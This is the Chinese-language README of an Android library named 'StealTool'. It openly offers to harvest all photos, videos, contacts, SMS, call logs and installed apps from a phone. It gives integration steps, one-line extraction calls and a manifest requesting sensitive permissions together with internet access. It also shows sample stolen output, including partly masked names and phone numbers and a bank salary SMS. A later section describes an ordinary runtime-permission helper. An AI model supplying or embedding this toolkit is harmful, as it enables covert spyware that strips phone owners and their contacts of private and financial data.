# 盗取手机敏感信息，Android 6.0之上兼容

### 项目介绍
- 盗取信息包含：
    - 手机中所有照片
    - 手机中所有视频
    - 手机中所有通讯录
    - 手机中所有短信
    - 手机中所有通话记录
    - 手机中所有安装应用
- 兼容Android 6.0及之上版本
- 动态权限申请工具开放

### 效果展示

##### 1.照片信息
```java
    MaterialBean{mLogo='/storage/emulated/0/Pictures/Screenshots/Screenshot_2017-07-23-01-38-14.png', title='Screenshot_2017-07-23-01-38-14.png', time='2017-07-23 01:38', filePath='/storage/emulated/0/Pictures/Screenshots/Screenshot_2017-07-23-01-38-14.png', isChecked=false, fileSize=1025172, fileId=89cfda75f36e44e3a46235937a8c3000, uploadedSize=0, fileType=6, uploaded=false, progress=0, timeStamps='1536657493366', flag='0'}

```
##### 2.视频信息
```java
      MaterialBean{mLogo='/storage/emulated/0/DCIM/Camera/视频/VID_20170917_130313.mp4', title='VID_20170917_130313.mp4', time='视频时间-00:00:11', filePath='/storage/emulated/0/DCIM/Camera/视频/VID_20170917_130313.mp4', isChecked=false, fileSize=29080924, fileId=7be02431aeff4d19b2612b686543ce10, uploadedSize=0, fileType=2, uploaded=false, progress=0, timeStamps='1536657639141', flag='0'}

```

##### 3.通讯录
```java
    PhoneUserInfo{id='daaf163b02d44e6dabf59cfb9a8c0958', name='*鹏', number='151**054191'}
    PhoneUserInfo{id='15aebbd2e6134e59992192b095f0e67c', name='侯*利', number='1830***2828'}
    PhoneUserInfo{id='28bcabbb14e24e3da4b5bd79c10dfa46', name='*八', number='187337**438'}
    PhoneUserInfo{id='3d637ea6910f4b71a105ae06b7ba3645', name='申通小哥', number='18513**8127'}

```

##### 4.短信
```java
    [ 10659805436945326, 0, 【luckin coffee】小蓝杯，北马爱~送你一张5折券（全场饮品通用）下载app立享http://t.cn/RlQ2ad3 回TD退订, 2018-09-11 01:42:27, 接收 ]

    [ 95555, 0, 您账户8693于09月11日11:42入账工资，人民币22267.30。[招商银行], 2018-09-11 11:46:28, 接收 ]

```

##### 5.通话记录
```java
     CallInfo{number='13141**2862', date=1527322406732, type=2}
    CallInfo{number='1891**85043', date=1527325280548, type=1}
    CallInfo{number='1360110**83', date=1527335837700, type=2}

```

##### 6.安裝App
```java
    AppInfo{appName='CSDN', appIcon='android.graphics.drawable.BitmapDrawable@eb62aed'}
    AppInfo{appName='皮皮虾', appIcon='android.graphics.drawable.BitmapDrawable@4f2ad22'}
    AppInfo{appName='Chrome', appIcon='android.graphics.drawable.BitmapDrawable@66043b3'}
    AppInfo{appName='UC浏览器', appIcon='android.graphics.drawable.BitmapDrawable@b0f8d70'}
    AppInfo{appName='抖音短视频', appIcon='android.graphics.drawable.BitmapDrawable@75788e9'}

```

### 最简单使用方式

##### 1. Add it in your root build.gradle at the end of repositories:

```java
allprojects {
		repositories {
			...
			maven { url 'https://jitpack.io' }
		}
	}
```
##### 2. Add the dependency

```java
dependencies {
	        implementation 'com.github.pengMaster:StealTool:1.0.0'
	}
```
##### 3. Add use to activity

```java
//获取图片
StealUtils.getAllLocalPhotos(this@MainActivity)

//获取视频
StealUtils.getAllLocalVideos(this@MainActivity)

//获取联系人
StealUtils.getAllContactInfo(this@MainActivity)

//获取短信
StealUtils.getSmsInPhone(this@MainActivity)

//获取通话记录
StealUtils.getCallInfos(this@MainActivity)

//获取安装所有App
StealUtils.getInstallApp(packageManager)


java (this) = kotlin (this@MainActivity)
java (getPackageManager()) = kotlin (packageManager)

```

##### 4. add permission to your menifest

```java
    <!--读-->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <!--联网-->
    <uses-permission android:name="android.permission.INTERNET" />
    <!--联系人-->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <!--短信-->
    <uses-permission android:name="android.permission.READ_SMS" />
    <!--通话记录-->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
```

### 介绍一下很好用的Android6.0动态权限申请工具


####  申请一个权限：
```
    PermissionUtils.checkAndRequestPermission(mContext, PERMISSION_CAMERA, REQUEST_CODE_CAMERA,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
            @Override
            public void onHasPermission() {
                // 权限已被授予

            }
        });
```
#### 然后在onRequestPermissionsResult中：

```
if(PermissionUtils.isPermissionRequestSuccess(grantResults))
                {
                    // 权限申请成功

                }
```

#### 什么？要同时申请多个权限？
```
    PermissionUtils.checkAndRequestMorePermissions(mContext, PERMISSIONS, REQUEST_CODE_PERMISSIONS,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
            @Override
            public void onHasPermission() {
                // 权限已被授予

            }
        });
```
#### 当然上面这些都不是申请权限的正确姿势，理想的姿势应该是：
- 第一次申请权限：按照正常流程走；
- 如果用户第一次拒绝了权限申请，第二次申请时应向用户解释权限用途；
- 如果用户勾选了“不再询问”选项，应引导用户去设置页手动开启权限。

于是，引申出了复杂版的权限申请方法：
## 自定义权限申请：
```
PermissionUtils.checkPermission(mContext, PERMISSION_CAMERA,
                new PermissionUtils.PermissionCheckCallBack() {
            @Override
            public void onHasPermission() {
                // 已授予权限

            }

            @Override
            public void onUserHasAlreadyTurnedDown(String... permission) {
                // 上一次申请权限被拒绝，可用于向用户说明权限原因，然后调用权限申请方法。
            }

            @Override
            public void onUserHasAlreadyTurnedDownAndDontAsk(String... permission) {
                // 第一次申请权限或被禁止申请权限，建议直接调用申请权限方法。
            }
        });
```
#### 然后在onRequestPermissionsResult中：

```
PermissionUtils.onRequestPermissionResult(mContext, PERMISSION_CAMERA, grantResults, new PermissionUtils.PermissionCheckCallBack() {
                    @Override
                    public void onHasPermission() {

                    }

                    @Override
                    public void onUserHasAlreadyTurnedDown(String... permission) {
                        Toast.makeText(mContext, "我们需要"+Arrays.toString(permission)+"权限", Toast.LENGTH_SHORT).show();
                    }

                    @Override
                    public void onUserHasAlreadyTurnedDownAndDontAsk(String... permission) {
                        Toast.makeText(mContext, "我们需要"+Arrays.toString(permission)+"权限", Toast.LENGTH_SHORT).show();
                        // 显示前往设置页的dialog
                        );
                    }
                });
```
#### 参与贡献

1. Fork 本项目
2. 新建 Feat_xxx 分支
3. 提交代码
4. 新建 Pull Request
5. 权限工具参考：https://github.com/ifadai/PermissionUtils


#### github地址

 - 项目地址：https://github.com/pengMaster/StealTool
